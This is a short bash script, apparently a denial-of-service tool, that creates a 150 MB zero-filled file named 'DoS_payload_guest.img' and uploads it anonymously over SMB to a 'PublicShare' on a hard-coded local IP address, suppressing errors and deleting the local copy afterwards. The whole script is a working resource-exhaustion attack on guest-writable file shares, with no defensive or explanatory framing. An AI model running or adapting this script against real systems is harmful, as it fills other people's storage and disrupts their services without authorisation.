#!/bin/bash

TARGET_IP="192.168.1.21"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

dd if=/dev/zero of=DoS_payload_guest.img bs=1M count=150 2>/dev/null

smbclient //${TARGET_IP}/PublicShare -N -c "put DoS_payload_guest.img" 2>/dev/null

rm -f DoS_payload_guest.img
exit 0
